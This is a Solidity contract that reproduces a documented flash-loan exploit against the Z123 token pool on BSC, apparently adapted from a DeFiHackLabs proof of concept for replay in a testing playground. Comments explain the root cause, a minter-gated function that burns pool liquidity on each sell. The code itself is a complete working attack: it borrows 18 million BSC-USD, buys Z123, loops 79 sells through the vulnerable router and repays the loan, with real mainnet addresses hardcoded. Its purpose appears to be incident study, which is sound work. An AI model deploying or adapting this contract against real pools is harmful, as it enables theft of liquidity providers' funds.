// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-04-Z123).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (Z123_exp is Test; testExploit() calls pancakeV3_.flash(...) directly and the
// flash callback pancakeV3FlashCallback() lives on the test contract itself, with
// attacker = address(this)), so there is nothing standalone to deploy. This
// contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/Z123_exp.sol.
//
// Root cause: SesameCloudToken (Z123) exposes an onlyMinter-gated
// update(address pair, uint256 amount) that does a raw _transfer(pair, DEAD,
// amount) -- moving Z123 OUT of the pair's balance with no counter-asset
// movement. The project's own custom router (`victim_`) calls this update()
// plus pair.sync() after every sell, silently burning 2,850 Z123 of pool
// liquidity per sell and forcing the pair to adopt the reduced balance as its
// new reserve. Looping sells through that router breaks the constant-product
// invariant in the seller's favor, extracting far more USD than the pool
// should allow.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IPancakeRouter {
    // NOTE: this router's actual implementation (QiaoswapV2Router02, a custom
    // fork) declares NO return value for this function -- unlike the standard
    // PancakeSwap/Uniswap V2 router ABI. Declaring a `returns (...)` here would
    // make solc ABI-decode the (empty) return data and revert with an
    // out-of-bounds panic, exactly matching the on-chain function it calls.
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract Z123Drain {
    IERC20 constant z123_ = IERC20(0xb000f121A173D7Dd638bb080fEe669a2F3Af9760);
    IPancakeV3Pool constant pancakeV3_ = IPancakeV3Pool(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IERC20 constant bsc_usd_ = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter constant router_ = IPancakeRouter(payable(0x901c0967DF19fA0Af98Fd958E70F30301d7580dD));
    IPancakeRouter constant victim_ = IPancakeRouter(payable(0x6125c643a2D4A927ACd63C1185c6be902eFd5dC8));

    function run() external {
        bsc_usd_.approve(address(router_), type(uint256).max);
        z123_.approve(address(router_), type(uint256).max);

        bsc_usd_.approve(address(victim_), type(uint256).max);
        z123_.approve(address(victim_), type(uint256).max);

        pancakeV3_.flash(address(this), 18_000_000 ether, 0, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        address[] memory path = new address[](2);
        path[0] = address(bsc_usd_);
        path[1] = address(z123_);
        router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            18_000_000 ether, 1, path, address(this), block.timestamp
        );

        path[0] = address(z123_);
        path[1] = address(bsc_usd_);
        for (int256 i = 0; i < 79; i++) {
            victim_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                7125 ether, 1, path, address(this), block.timestamp
            );
        }

        // repay
        bsc_usd_.transfer(address(pancakeV3_), 18_000_000 ether + fee0);
    }
}
